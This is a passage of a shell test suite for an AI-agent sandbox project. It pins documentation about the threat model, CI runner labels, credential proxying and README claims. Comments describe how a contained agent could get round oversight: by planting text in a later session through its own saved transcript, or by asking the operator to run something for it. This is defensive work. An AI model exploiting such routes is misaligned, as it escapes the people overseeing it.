    grep -qi 'watcher that has died looks exactly like a watcher with nothing to report' <<< "$flat" \
        || { echo "nothing says why the uptime monitor is not optional in practice"; return 1; }
}

@test "dejima-guard is characterised by what it adds, not by how it differs from dejima" {
    # An earlier draft described it by the three gaps its own SECURITY.md
    # lists - no egress bound, key in the container, no request logging. Those
    # are accurate and they are all comparisons WITH DEJIMA rather than an
    # account of the guard's own exposure, so they put the two things a reader
    # needs below three that matter less. Corrected on the advice of the
    # project itself, which moved the same three below the same two.
    #
    # What actually characterises it: it enforces nothing, it is the only
    # component that ADDS a credential-holding machine instead of taking
    # capability away, and root on the watched box can lie to its collector.
    local flat
    flat="$(flat_prose "$REPO_ROOT/docs/threat-model.md")"
    local claim
    for claim in \
        'It enforces nothing' \
        'only piece here that adds a machine holding credentials rather than taking capability away' \
        'exposure is bounded by the hardening of a machine this stack does not describe' \
        'detection ceiling is root on the watched box' \
        'heartbeat proves the guard ran, not that it saw the truth' \
        'one bounds where a compromise spreads, the other notices that one happened'
    do
        grep -qi -- "$claim" <<< "$flat" \
            || { echo "the guard's account no longer says: $claim"; return 1; }
    done
    # Linked, like the other two, and pointed at its own SECURITY.md for the
    # comparisons this doc deliberately does not lead with.
    local tm="$REPO_ROOT/docs/threat-model.md"
    grep -q '(https://gitbox.branderson.io/dejima/dejima-guard)' "$tm" \
        || { echo "dejima-guard is named but not linked"; return 1; }
    grep -q 'dejima-guard/src/branch/main/SECURITY.md' "$tm" \
        || { echo "nothing points at the guard's own security policy"; return 1; }
}

@test "docs/research-review.md exists and carries its standing questions" {
    # The process is only worth having if the agenda is in it: a review with no
    # standing questions becomes a reading list, which is the failure mode it
    # exists to avoid.
    local doc="$REPO_ROOT/docs/research-review.md"
    [ -f "$doc" ] || { echo "the review process is gone"; return 1; }
    grep -q '^## The standing questions' "$doc" \
        || { echo "the agenda is gone; what is left is a reading list"; return 1; }
    grep -q '^## The standing test queue' "$doc" \
        || { echo "the test queue is gone, so findings stay hypotheses"; return 1; }
    # And it says where a sweep does NOT go. Reviews, specs and plans are
    # ephemeral and live on the operator's machine; what belongs in the
    # repository is the action a review produced, not the reasoning behind it.
    grep -qi 'not committed here' "$doc" \
        || { echo "the doc no longer says a sweep stays out of the repository"; return 1; }
    # Held structurally too, so the practice cannot drift into a directory of
    # reading notes that nobody acts on.
    local d
    for d in findings sweeps research reviews docs/findings docs/research; do
        [ ! -d "$REPO_ROOT/$d" ] \
            || { echo "$d/ exists; sweeps are being committed after all"; return 1; }
    done
    # Quarterly, because the argument for a schedule is capability drift rather
    # than anything on the current list.
    grep -qi 'quarterly' "$doc" || { echo "the standing sweep lost its schedule"; return 1; }
}

@test "docs/threat-model.md exists and is linked from the README and docs/security.md" {
    [ -f "$REPO_ROOT/docs/threat-model.md" ]
    grep -q 'docs/threat-model\.md' "$REPO_ROOT/README.md"
    grep -q '(threat-model\.md)' "$REPO_ROOT/docs/security.md"
}

@test "the blast-radius table is identical in both places that carry it" {
    # It is deliberately in two documents: security.md is where an operator
    # already is, threat-model.md is where the reasoning around it lives.
    # Two copies drift, and a table stating where a compromise stops is the
    # worst kind to have two answers for - so neither may be edited alone.
    local a b
    a="$(sed -n '/^| Layer | Reached by/,/^$/p' "$REPO_ROOT/docs/security.md")"
    b="$(sed -n '/^| Layer | Reached by/,/^$/p' "$REPO_ROOT/docs/threat-model.md")"
    [ -n "$a" ] || { echo "no table in docs/security.md"; return 1; }
    [ -n "$b" ] || { echo "no table in docs/threat-model.md"; return 1; }
    [ "$a" = "$b" ] || { diff <(printf '%s' "$a") <(printf '%s' "$b"); return 1; }
    # Every layer the two sister projects cover, so a row cannot quietly go
    # missing and leave the chain looking shorter than it is.
    local row
    for row in 'Agent, not yet hostile' 'Container' \
               'Devbox VM, unprivileged' 'Devbox VM, root' \
               'CI, confined job' 'CI, confined job escaped' \
               'CI, privileged job'; do
        grep -qF "| $row |" <<< "$b" || { echo "no row for: $row"; return 1; }
    done
}

@test "identities are documented as the session's accounts, not the operator's" {
    # configuration.md described an [identity.<name>] as grouping what belongs
    # to a person rather than a project, and gave "work" and "oss" as the
    # example - one human's two accounts. Both README and security.md tell you
    # the opposite: give the session an account that is not you. An identity
    # is how a host holds several of those, one per session.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/configuration.md" | tr -d '*`' | tr -s ' ')"
    grep -qi 'several accounts on one machine, and none of them yours' <<< "$flat" \
        || { echo "identities read as an operator's own accounts again"; return 1; }
    # The reason there is more than one, which is the whole feature.
    grep -qi 'scope, revoke and read in a log independently' <<< "$flat" \
        || { echo "the separation is unexplained"; return 1; }
    # And the claim that sent someone looking for a project-side setting that
    # does not exist.
    grep -qi 'there is no .dejima/ kind for an identity' <<< "$flat" \
        || { echo "the docs no longer say a project cannot select one"; return 1; }
    run grep -c 'identity.work\|identity.oss' <<< "$flat"
    [ "$output" -eq 0 ] \
        || { echo "the person-shaped example is back"; return 1; }

    # Every identity the prose names has to be one the example block defines.
    # Renaming the examples left `oss` and `wrok` behind as references to
    # sections that no longer existed, and the greps above passed throughout:
    # they match the section-header spelling, and the prose says "the oss
    # identity". The one deliberate exception is the name introduced as having
    # no section, which is the point of that sentence - so it is allowed only
    # on the sentence that makes it.
    local doc="$REPO_ROOT/docs/configuration.md" defined name
    defined="$(grep -oE '^\[identity\.[a-z0-9-]+\]' "$doc" | sed 's/^\[identity\.//; s/\]$//')"
    [ -n "$defined" ] || { echo "the identity example block is gone"; return 1; }
    for name in $(grep -oE '(--identity|\[core\] identity =) *`?[a-z][a-z0-9-]*' "$doc" \
                      | grep -oE '[a-z][a-z0-9-]*$' | sort -u); do
        [ "$name" = "identity" ] && continue
        grep -qx "$name" <<< "$defined" && continue
        grep -qE "no section is refused.{0,80}$name" \
            <<< "$(tr '\n' ' ' < "$doc" | tr -s ' ')" \
            || { echo "the prose names identity '$name', which no section defines"; return 1; }
    done
}

@test "core never reads a harness's config by a literal harness name" {
    # `keys` is declared per harness, so a fixed [harness.<name>] at a call
    # site makes it a declaration only one harness can ever be read through:
    # a second harness is selected, is validated, and is then handed the
    # first one's paths with nothing erroring anywhere. A silent wrong
    # answer, so it gets a test rather than a convention.
    run grep -rn 'config_get["'"'"' ]*harness\.[a-z]' "$REPO_ROOT/bin"
    [ "$status" -ne 0 ] || { echo "use harness_config_get instead:"; echo "$output"; return 1; }
    grep -q '^harness_config_get()' "$REPO_ROOT/bin/dejima-provider-lib.sh"
}

@test "the harness guide states the bar a harness has to clear" {
    # Support is per harness and deliberate, at the depth Claude Code has.
    # That only holds if the requirements are written down: without them
    # each new harness is argued about rather than measured, and the first
    # one that cannot host a guard gets waved through.
    local sec r
    grep -q '^## Adding a new harness' "$REPO_ROOT/docs/development.md"
    sec="$(sed -n '/^### What a harness must be able to do/,/^### What the manifest/p' \
        "$REPO_ROOT/docs/development.md")"
    [ -n "$sec" ] || { echo "the capability bar is gone"; return 1; }
    for r in R1 R3 R4 R5; do
        grep -q "\*\*$r\*\*" <<< "$sec" || { echo "no $r in the bar"; return 1; }
    done
    # R2 moved to the declarable table when the push and merge guards stopped
    # needing it. The gap is deliberate, and the move has to stay stated -
    # a bar that simply lost a requirement reads as an oversight.
    grep -q 'R2 is not missing from the table above' <<< "$sec" \
        || { echo "the bar drops R2 without saying where it went"; return 1; }
    grep -qE '\*\*D1\*\*.*was R2' <<< "$sec" \
        || { echo "D1 does not identify itself as the former R2"; return 1; }
    # Unattended execution is the premise every other control is justified
    # against, so it stays stated rather than assumed.
    grep -qi 'without confirming each one' <<< "$sec"
}

@test "a harness dejima declines is declined against a stated requirement" {
    # The reason has to point at a rule. Otherwise the bar is decoration and
    # the next harness is decided on how much someone wants it.
    local sec
    sec="$(sed -n '/^### Worked example/,/^### What the manifest/p' \
        "$REPO_ROOT/docs/development.md")"
    [ -n "$sec" ] || { echo "no worked example of a refusal"; return 1; }
    grep -q 'R2' <<< "$sec" \
        || { echo "the refusal names no requirement it failed"; return 1; }
}

@test "nothing that builds a session runs an epitaph command that reads" {
    # `save` writes the store; `list`, `search` and `show` read it. A session
    # can write its own transcript, so it can author what its own epitaph
    # says - routing one back into a later session's startup would plant
    # text in its premises as established background, which is the channel
    # the never-mounted store closes (#104). The launcher may therefore call
    # `save` and nothing else, and the context hook must not call it at all.
    local line
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        grep -q 'dejima-epitaph" save' <<< "$line" \
            || { echo "bin/dejima runs an epitaph command other than save: $line"; return 1; }
    done < <(grep -n 'dejima-epitaph' "$REPO_ROOT/bin/dejima" | grep -v '^\s*#')
    for f in "$REPO_ROOT/hooks/sandbox-context.sh" "$REPO_ROOT/bin/dejima-provider-lib.sh"; do
        run grep -n 'dejima-epitaph' "$f"
        [ "$status" -ne 0 ] || { echo "$f reaches for epitaph: $output"; return 1; }
    done
}

@test "docs/ci.md exists and is linked from the README and docs/security.md" {
    [ -f "$REPO_ROOT/docs/ci.md" ]
    grep -q 'docs/ci\.md' "$REPO_ROOT/README.md"
    grep -q '(ci\.md)' "$REPO_ROOT/docs/security.md"
}

# The whole allowlist argument in docs/ci.md rests on reading the declaration
# from the branch the operator controls. A future edit that softens this into
# "read .dejima/allowed-domains" without saying from where would leave the
# document describing a control that doesn't control anything.
# runs-on lives in the workflow file, which lives in the branch, so a
# dedicated label routes honest jobs and stops nothing else. An earlier version
# of this document said jobs "cannot land anywhere else", which is true only of
# a branch that is not trying - the exact distinction the rest of the document
# is built on. Pinned so it cannot quietly come back.
# The counterintuitive half of the advisory, and the one a reader is most
# likely to skip: a project with no CI is exposed too, because a branch adds
# the first workflow. If that goes missing, the document reads as being about
# people who already run CI, which is the smaller group.
# Who wrote the prose. The repository argues at length in a voice that is not
# its maintainer's, and saying so is the difference between disclosure and
# letting a reader assume. Pinned because it is the kind of line that goes
# quietly in a tidy-up, and its absence is not visible from anything else.
@test "the README leads with what is different, not with the premise" {
    # "Assume the agent is hostile" is the field's default position as of 2026
    # - a survey of comparable projects found the premise everywhere. Opening
    # on it claims novelty dejima does not have, and buries the thing it does:
    # that the blast radius is followed past the container.
    #
    # Pinned because it is a positioning claim, and those drift back toward
    # whatever is easiest to write.
    # Everything before the first "What bounds it:" heading, with newlines
    # flattened: the claims below are sentences, and a sentence that happens to
    # wrap would otherwise fail a grep for reasons that have nothing to do with
    # what it says.
    local opening
    opening="$(sed -n '1,/^\*\*What bounds it:\*\*/p' "$REPO_ROOT/README.md" | tr '\n' ' ')"
    [ -n "$opening" ] || { echo "no opening section found"; return 1; }
    grep -qi 'stop at the container' <<< "$opening" \
        || { echo "the opening no longer says where dejima differs"; return 1; }
    # Layers, not a list of the tools, so a fourth does not need this rewritten.
    grep -qi 'every layer' <<< "$opening" \
        || { echo "the layering is gone from the opening"; return 1; }

    # And the pitch stays a pitch. A reader arriving here has a short attention
    # budget, and the first draft of this spent it on how the differentiator was
    # arrived at - a survey, a date, what the field believes - rather than on
    # the differentiator. That is a history lesson, and it is the failure this
    # budget exists to catch, because it is the one that reads as thorough.
    local pitch words
    pitch="$(sed -n "/^\*\*Agents work best/,/^dejima is a \\*\\*sandboxed/p" \
        "$REPO_ROOT/README.md" | sed '$d')"
    words="$(wc -w <<< "$pitch")"
    [ "$words" -le 100 ] \
        || { echo "the opening pitch is $words words, budget is 100"; return 1; }
    [ "$words" -ge 30 ] \
        || { echo "the opening pitch is only $words words"; return 1; }
}

@test "the README's axis lists match what is shipped" {
    # It listed claude-code as the only harness for as long as cline had been
    # shipping: a hand-maintained list of directories goes stale in the
    # direction of telling a reader the thing they came for does not exist.
    # Asserted against the LIST line, not the whole file - a provider name
    # appears elsewhere in the README, so a whole-file grep passes while the
    # list itself is wrong. The first version of this did exactly that and
    # survived deleting cline.
    local axis dir name line
    for axis in forges workflows harnesses; do
        case "$axis" in
            forges)     line="$(grep -n '^- .*Forges:' "$REPO_ROOT/README.md" | head -1)" ;;
            workflows)  line="$(grep -n '^- .*Workflows:' "$REPO_ROOT/README.md" | head -1)" ;;
            harnesses)  line="$(grep -n '^- .*Harnesses:' "$REPO_ROOT/README.md" | head -1)" ;;
        esac
        [ -n "$line" ] || { echo "the README has no $axis list at all"; return 1; }
        for dir in "$REPO_ROOT/$axis"/*/; do
            [ -d "$dir" ] || continue
            name="$(basename "$dir")"
            grep -q "\`$name\`" <<< "$line" \
                || { echo "$axis/$name ships and the README's list omits it"; return 1; }
        done
    done
}

@test "the README does not state one harness's specifics as universal" {
    # Claude Code is the primary tenant and not the only one. Claims that read
    # as universal and were not: that you must sign in on the host, when a
    # harness pointed at a model you serve yourself needs no credential; that
    # install.sh writes hooks into ~/.claude, when the selected harness's
    # plugin does and only for the one selected; and the pitch naming one
    # harness's no-prompt flag as the mechanism.
    local flat
    flat="$(flat_prose "$REPO_ROOT/README.md")"

    # The flag belongs to one harness; each declares its own no_confirm_args.
    run grep -c 'dangerously-skip-permissions' <<< "$flat"
    [ "$output" -eq 0 ] \
        || { echo "the README states one harness's no-prompt flag as the mechanism"; return 1; }

    # The sign-in prerequisite is real and conditional, and the conditional
    # half is what goes missing.
    grep -qi 'sign in to it there if it needs a credential' <<< "$flat" \
        || { echo "the sign-in prerequisite reads as unconditional again"; return 1; }
}

@test "the threat model names the handoff as a route in" {
    # dejima tells agents to hand host-side work to the operator. That is a
    # designed, frequent workflow and therefore a delivery mechanism, and it
    # was the one route in that the ranked list did not name.
    local tm="$REPO_ROOT/docs/threat-model.md"
    grep -q 'operator running something the session asked them to run' "$tm" \
        || { echo "the handoff is unnamed again"; return 1; }
    # And is not read as an argument for removing the handoff, which would
    # produce a session that works around the operator instead.
    grep -qi 'not an argument for making the handoff harder' "$tm" \
        || { echo "it reads as a case for removing the workflow"; return 1; }
}

@test "the README frames dejima as a development environment, not only a sandbox" {
    grep -q 'sandboxed development environment' "$REPO_ROOT/README.md"
    # The half that is not containment has to be visible as such. A reader
    # who is shown only the boundary learns what dejima stops and not what
    # it is for.
    grep -q 'What it gives an agent to work with' "$REPO_ROOT/README.md"
}

@test "the README does not promise a default harness" {
    # `[core] harness` has had no default since it became required - a launch
    # is refused without it - but the opening paragraph still read "Claude
    # Code by default", which is the promise that change exists to not make.
    run grep -n 'Claude Code by default' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    # The same promise in the Usage section's spelling, which survived the
    # first fix because it named the binary rather than the harness.
    run grep -c 'entry point is bare' <<< "$(flat_prose "$REPO_ROOT/README.md")"
    [ "$output" -eq 0 ] || { echo "the README names a default entry point"; return 1; }
}

@test "the README says the prose is written by agents" {
    grep -q 'A note from the developer' "$REPO_ROOT/README.md"
    grep -q 'the words are written rapidly' "$REPO_ROOT/README.md"
    # the contrast that makes both claims credible: ATTRIBUTION.md says the
    # artwork is the other way round, and the README points at it
    grep -q 'no AI tools were used to create it' "$REPO_ROOT/README.md"
    grep -q 'No AI tools were used' "$REPO_ROOT/ATTRIBUTION.md"
}

# The maturity disclaimer, pinned in all three places a reader can land. A
# project that argues at length for its own security properties is exactly the
# one that has to say those properties are unreviewed - and it is the first
# thing that gets quietly dropped as a project starts to feel established.
@test "every entry point says this is unreviewed early development" {
    local f
    for f in README.md SECURITY.md docs/security.md; do
        grep -q 'reviewed by anyone else\|outside review' "$REPO_ROOT/$f" || {
            echo "$f does not say the work is unreviewed" >&2
            false
        }
    done
    grep -q 'Not ready to be depended on' "$REPO_ROOT/README.md"
    grep -q 'not proven software' "$REPO_ROOT/SECURITY.md"
}

# The GitHub push default was documented as mechanism only - port 443, port 22
# unreachable - and a reader who needed the reason inferred the wrong one: that
# it is a containment measure against a hostile session. It is not. The
# repositories on the other side are other people's, and the failure it
# prevents takes no compromise, only an agent being helpful at a stranger's
# expense. Pinned in both places a reader lands, because getting this wrong
# leads someone to turn the flag on believing it costs them nothing.
@test "the GitHub push default is documented with its reason, not just its mechanism" {
    # Matched on a fragment rather than the whole sentence: it wraps
    # differently in each file, and a line-based grep cannot span that.
    local f
    for f in README.md docs/security.md; do
        grep -q 'not being used to push' "$REPO_ROOT/$f" || {
            echo "$f gives the mechanism without the principle" >&2
            false
        }
    done
    # the eager-agent case, which is what makes the principle concrete - and
    # that it is not softened into a well-meaning near-miss. The unsolicited
    # pull request is the thing being prevented, not a good deed with bad
    # timing; docs/responsible-use.md is where the cost to maintainers is set
    # out, and this must not read as disagreeing with it.
    grep -q 'an eager agent, not a compromised one' "$REPO_ROOT/docs/security.md"
    grep -q 'does not make it harmless' "$REPO_ROOT/docs/security.md"
    # and the ordering a reader got backwards: CI follows from the principle
    # rather than being the reason for it
    grep -q 'not the$\|reason for it' "$REPO_ROOT/docs/security.md"
    grep -q 'dont-point-it-at-repositories-you-dont-own' "$REPO_ROOT/docs/security.md"
}

# The branch convention is only a convention - nothing refuses a pull request
# aimed at main - so the three places an agent or a contributor looks have to
# agree, or the one that is stale becomes the instruction someone follows.
@test "the development-branch convention is stated where it is looked for" {
    local f
    for f in .dejima.md CONTRIBUTING.md docs/development.md; do
        grep -q 'development' "$REPO_ROOT/$f" || {
            echo "$f does not mention the development branch" >&2
            false
        }
    done
    # and the one thing that is easy to get wrong: gitea-pr's default base
    grep -q -- '--base development' "$REPO_ROOT/.dejima.md"
    grep -q -- '--base development' "$REPO_ROOT/docs/development.md"
}

@test "docs/ci.md says a project with no CI is exposed too" {
    grep -q 'applies to projects with no CI at all' "$REPO_ROOT/docs/ci.md"
    grep -q 'no workflows is not therefore safe' "$REPO_ROOT/docs/ci.md"
    grep -qi 'holds for projects with no CI' "$REPO_ROOT/README.md"
}

# Moving a public project to another owner breaks its name, its links and its
# ownership. It must not read as the recommended answer, and the alternatives
# that require moving nothing have to be present.
@test "docs/ci.md offers answers that do not require moving a repository" {
    local f="$REPO_ROOT/docs/ci.md"
    grep -q 'Scope the dangerous runner down, rather than moving' "$f"
    grep -q 'Turn CI off for that repository' "$f"
    grep -q 'Do not grant push' "$f"
}

@test "docs/ci.md does not present the runner label as a boundary" {
    grep -q 'A label is not a boundary' "$REPO_ROOT/docs/ci.md"
    grep -q 'weakest runner it can reach' "$REPO_ROOT/docs/ci.md"
    run grep -n 'cannot land anywhere else' "$REPO_ROOT/docs/ci.md"
    [ "$status" -ne 0 ] || { echo "$output" >&2; false; }
}

# The shared-identity point is what decides whether an operator's branch
# protection does anything, and it is the kind of thing that reads as a
# digression to a later editor. Pinned in both places, and pinned together
# with the separation that fixes it - stating the problem without the remedy
# would leave a reader with nothing to do about it.
@test "docs/security.md documents that the sandbox authenticates as the operator" {
    grep -q 'the sandbox is you' "$REPO_ROOT/docs/security.md"
    grep -qi 'guard rather than a boundary' "$REPO_ROOT/docs/security.md"
    grep -q 'forge.gitea. token_file' "$REPO_ROOT/docs/security.md"
    grep -q 'core. ssh_key' "$REPO_ROOT/docs/security.md"
}

@test "docs/ci.md's branch-protection prerequisite links the shared-identity section" {
    grep -q 'security.md#to-your-forge-the-sandbox-is-you' "$REPO_ROOT/docs/ci.md"
}

@test "docs/ci.md says the CI allowlist is read from main, not from the checkout" {
    grep -q 'origin/main' "$REPO_ROOT/docs/ci.md"
    grep -qi 'never from the checkout' "$REPO_ROOT/docs/ci.md"
}

# bin/dejima names docs/configuration.md in user-facing diagnostics and
# comments; bin/dejima, bin/dejima-credential-proxy and bin/dejima-audit all
# name docs/security.md the same way. Before the docs restructure these named
# the README, which cannot be renamed. Now they name files that can be. None
# of these are grep'd out of one canonical string the way docs/remote-access.md
# is above - each script just spells the path out - so this walks every
# docs/*.md reference actually present in these scripts and checks the target
# exists, rather than hardcoding the two names here too and letting a rename
# desync the test from the code.
@test "the Anthropic arrangement is declared in its manifest, not written in core" {
    # #171's whole point. Before the axis these values were flags on
    # bin/dejima's launch line; now they are a file, and adding a provider is
    # adding a directory rather than editing core.
    #
    # The three that carry the security property rather than the shape:
    # x-api-key must not travel beside the injected Authorization, the OAuth
    # beta must be present or the API rejects the token, and the kind has to
    # be the refreshing one or a rotated token is never written back.
    local m="$REPO_ROOT/backends/anthropic/backend.conf"
    [ -f "$m" ] || { echo "the anthropic provider manifest is gone"; return 1; }
    local want
    for want in 'upstream *= *https://api\.anthropic\.com' \
                'proxied_domain *= *api\.anthropic\.com' \
                'credential *= *anthropic-oauth' \
                'oauth_endpoint *= *https://platform\.claude\.com' \
                'auth_header *= *Authorization' \
                'auth_format *= *Bearer \{token\}' \
                'strip_headers *=.*x-api-key' \
                'ensure_headers *=.*anthropic-beta=oauth-2025-04-20'; do
        grep -qE "^$want" "$m" \
            || { echo "the manifest no longer declares: $want"; return 1; }
    done
    # And core writes none of it. A constant here would be the arrangement
    # living in two places, which is how they drift.
    local d="$REPO_ROOT/bin/dejima" body
    body="$(grep -v '^[[:space:]]*#' "$d")"
    for want in 'api\.anthropic\.com' 'platform\.claude\.com' \
                'oauth-2025-04-20' '9d1c250a'; do
        grep -qE -- "$want" <<< "$body" \
            && { echo "core still writes a provider constant: $want"; return 1; }
    done
    return 0
}

@test "every field the backend manifest declares reaches the proxy's argv" {
    # A manifest key nothing passes through is a declaration that does
    # nothing, and the failure is silent: the proxy falls back to its own
    # default, or to none, and the session runs with an arrangement the
    # operator did not configure. Pinned on the launch block itself rather
    # than anywhere in the file.
    local launch
    launch="$(sed -n '/_proxy_args=(/,/dejima-credential-proxy" "\${_proxy_args\[@\]}"/p' "$REPO_ROOT/bin/dejima")"
    [ -n "$launch" ] || { echo "bin/dejima no longer builds the proxy argument list"; return 1; }
    local pair
    for pair in 'upstream:--upstream' 'auth_header:--auth-header' \
                'auth_format:--auth-format' 'strip_headers:--strip-header' \
                'ensure_headers:--ensure-header' \
                'oauth_endpoint:--oauth-endpoint' \
                'oauth_client_id:--oauth-client-id'; do
        grep -q -- "${pair##*:}" <<< "$launch" \
            || { echo "no ${pair##*:} on the launch"; return 1; }
        grep -q -- "${pair%%:*}" <<< "$launch" \
            || { echo "${pair%%:*} is never read from the manifest"; return 1; }
    done
    # The credential kind and file come from the provider too, not from a
    # hardcoded path to one harness's credential store.
    grep -q -- '--credential-kind "\$DEJIMA_BACKEND_CREDENTIAL_KIND"' <<< "$launch" \
        || { echo "the credential kind is not the provider's"; return 1; }
    grep -q -- '--credentials "\$DEJIMA_BACKEND_CREDENTIAL_FILE"' <<< "$launch" \
        || { echo "the credential file is not the provider's"; return 1; }
}

@test "the credential proxy names no provider constant anywhere in its code" {
    # The whole of #171: a proxy that knows one provider's name has to grow a
    # branch for every other. The credential KIND is allowed to say anthropic,
    # since the OAuth file shape genuinely is Anthropic's, and so is the CLI
    # that names the choices - what must not come back is a hostname, an
    # endpoint or a header value baked into the request path.
    local f="$REPO_ROOT/bin/dejima-credential-proxy" body
    # The whole file, comments excluded. Argument parsing was excluded here at
    # first, which let a default of --upstream https://api.anthropic.com back
    # in without failing - and a default is exactly where this regresses,
    # because it is the form that keeps working for the one provider while
    # being wrong for every other. Comments stay excluded: this is about what
    # the code does, not what it is allowed to explain.
    body="$(grep -v '^[[:space:]]*#' "$f")"
    local bad
    for bad in 'api.anthropic.com' 'platform.claude.com' 'oauth-2025-04-20' \
               '9d1c250a'; do
        grep -q -- "$bad" <<< "$body" \
            && { echo "the proxy has learned a provider constant again: $bad"; return 1; }
    done
    return 0
}

@test "docs/*.md references in bin/dejima, bin/dejima-credential-proxy and bin/dejima-audit resolve to real files" {
    local f doc missing=0
    for f in bin/dejima bin/dejima-credential-proxy bin/dejima-audit; do
        for doc in $(grep -ohE 'docs/[a-z-]+\.md' "$REPO_ROOT/$f" | sort -u); do
            if [ ! -f "$REPO_ROOT/$doc" ]; then
                echo "$f references $doc, which does not exist" >&2
                missing=1
            fi
        done
    done
    [ "$missing" -eq 0 ]
}

# Other repositories in the organisation link to these two by absolute URL
# rather than keeping copies, so the terms cannot drift into two divergent
# statements. A rename here is a 404 in a repository whose tests cannot see
# this one.
@test "the org-wide policy files other repositories link to keep their names" {
    [ -f "$REPO_ROOT/SECURITY.md" ]
    [ -f "$REPO_ROOT/ATTRIBUTION.md" ]
}

# The wordmark is referenced by a fixed filename on purpose - see the comment
# above the tag - which means a rename is caught here or not at all.
# Markdown image syntax as well as <img>, and svg as well as png: the badge
# is referenced the markdown way and is the case this exists for.
@test "every image the README points at is committed" {
    local src missing=0
    for src in $(grep -ohE 'src="[^"]+\.(png|svg)"|\]\([^)]+\.(png|svg)\)' "$REPO_ROOT/README.md" \
        | sed 's/^src="//; s/"$//; s/^](//; s/)$//'); do
        if [ ! -f "$REPO_ROOT/$src" ]; then
            echo "README points at $src, which does not exist" >&2
            missing=1
        fi
    done
    [ "$missing" -eq 0 ]
}

# --- the labels this repo's own workflow asks for ---
#
# Whether a job container gets the Docker socket is settled by the runner's
# config.yaml - which lives in dejima-ci-hardener's territory, not this
# repository's - so the only lever here is which runner its jobs may land on.
# A generic label gives that lever away, which is what these pin.

# pull_request_target reads this workflow from the base branch, which is what
# pins runs-on out of a branch's reach. Reverting to pull_request hands that
# back, silently.
@test "the workflow is read from the base branch, not the branch under test" {
    local wf="$REPO_ROOT/.gitea/workflows/tests.yml"
    grep -qE '^  pull_request_target:' "$wf"

    # pull_request may still be present, but only while the transition is
    # explicitly in progress - it takes an untrusted run from the head with
    # branch-controlled runs-on, which is the thing being removed. Requiring
    # the marker means the day it is dropped, this fails until the trigger
    # goes with it, rather than the pair quietly becoming permanent.
    if grep -qE '^  pull_request:' "$wf"; then
        grep -q 'TRANSITIONAL' "$wf" || {
            echo "pull_request is still enabled without the transitional note -" >&2
            echo "it hands runs-on back to the branch. Remove the trigger." >&2
            false
        }
    fi
}

# The trap in that conversion: the run's ref is the BASE branch, so a bare
# checkout tests main and passes regardless of the change. Every suite that
# means to test the branch has to name the head explicitly - and a green run
# is exactly what it looks like when one does not.
@test "every suite that tests the branch checks out the branch" {
    local wf="$REPO_ROOT/.gitea/workflows/tests.yml"
    # The property, not a count: every checkout is either pinned to the head
    # sha or is one of the runner-env jobs, whose assertions should come from
    # the base branch. A count breaks on adding a job, which is when someone
    # is least likely to be thinking about which ref it reads.
    local checkouts pinned
    checkouts="$(grep -c 'uses: actions/checkout@v4' "$wf")"
    pinned="$(grep -c 'pull_request.head.sha' "$wf")"
    [ "$checkouts" -gt 0 ] || { echo "no checkout at all"; return 1; }
    # Each pin is the line after the `with:` under its own checkout, so the
    # pinned count can never exceed the checkout count.
    [ "$pinned" -le "$checkouts" ] || { echo "more pins than checkouts"; return 1; }
    # Every branch-testing job is pinned. The unpinned remainder is exactly
    # the two runner-env jobs, named here so adding a third is a decision.
    local unpinned=$((checkouts - pinned))
    [ "$unpinned" -eq 2 ] || {
        echo "$unpinned checkouts read the base branch, expected 2" >&2
        echo "(runner-env-confined and runner-env-privileged). A new job that" >&2
        echo "tests the change must pin \${{ github.event.pull_request.head.sha }}." >&2
        return 1
    }
}

@test "no workflow job runs on a generic runner label" {
    run grep -nE '^\s*runs-on:\s*(ubuntu|windows|macos|self-hosted)' \
        "$REPO_ROOT"/.gitea/workflows/*.yml
    [ "$status" -ne 0 ] || {
        echo "a generic label lets this job land on a runner nobody hardened:" >&2
        echo "$output" >&2
        false
    }
}

@test "every workflow job runs on a dejima-specific label" {
    while IFS= read -r label; do
        [[ "$label" == dejima-* ]] || {
            echo "unexpected runs-on label: $label" >&2
            false
        }
    done < <(grep -hE '^\s*runs-on:' "$REPO_ROOT"/.gitea/workflows/*.yml \
        | sed -E 's/^\s*runs-on:\s*//')
}

# Remote access is opt-in and off by default, so the marker-directory check
# must be inside the "was it configured at all" guard. Outside it, every
# ordinary session gets a warning about a feature it never asked for - and a
# warning that fires on every start is one nobody reads.
@test "the marker-directory check only runs when remote access is configured" {
    local f="$REPO_ROOT/docker/entrypoint.sh"
    grep -q 'if \[ -n "${DEJIMA_NOTIFY_DIR:-}" \]; then' "$f"
    # The check's own output must sit inside that guard, not before it.
    guard=$(grep -n 'if \[ -n "${DEJIMA_NOTIFY_DIR:-}" \]; then' "$f" | head -1 | cut -d: -f1)
    warn=$(grep -n 'remote access is enabled, but' "$f" | head -1 | cut -d: -f1)
    [ "$guard" -lt "$warn" ]
}

# Chowning it would restore notifications while the session stayed absent from
# dejima-attach, because the registry entry is written host-side and never
# mounted here - a session that looked fixed with half the feature still
# broken. The remedy is relaunching, which the message names.
@test "the marker-directory check reports rather than repairs" {
    local f="$REPO_ROOT/docker/entrypoint.sh"
    run grep -nE 'chown[^|]*DEJIMA_NOTIFY_DIR|chmod[^|]*DEJIMA_NOTIFY_DIR' "$f"
    [ "$status" -ne 0 ] || { echo "$output" >&2; false; }
    grep -q "start a new session with 'dejima'" "$f"
}

# bin/dejima warns and continues rather than refusing. The neighbouring
# state-dir check does refuse, but that one is about a symlink handing a
# session an attacker-chosen path; this one is only about an optional feature
# working, and blocking a launch over undeliverable notifications costs more
# than it saves.
@test "bin/dejima warns about an unusable marker directory without refusing" {
    local line
    line=$(grep -n 'is not a directory this user owns and can write' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    [ -n "$line" ]
    run sed -n "$((line)),$((line + 6))p" "$REPO_ROOT/bin/dejima"
    [[ "$output" != *"exit 1"* ]]
}

@test "sandbox-context.sh no longer mentions ALLOWED_DOMAINS" {
    run grep -n 'ALLOWED_DOMAINS' "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -ne 0 ]
}

# The repo is public; the operator's own network is not. Both shapes below
# leaked into it once (a .localdomain Gitea host in bin/gitea-pr, a real LAN
# address as the Loki example in docker-compose.yml), so they are pinned
# here. Documentation addresses belong in RFC 5737's ranges (192.0.2.0/24,
# 198.51.100.0/24, 203.0.113.0/24) and documentation names under RFC 2606's
# reserved TLDs.
#
# test/ is deliberately out of scope: fixtures stub real resolver answers
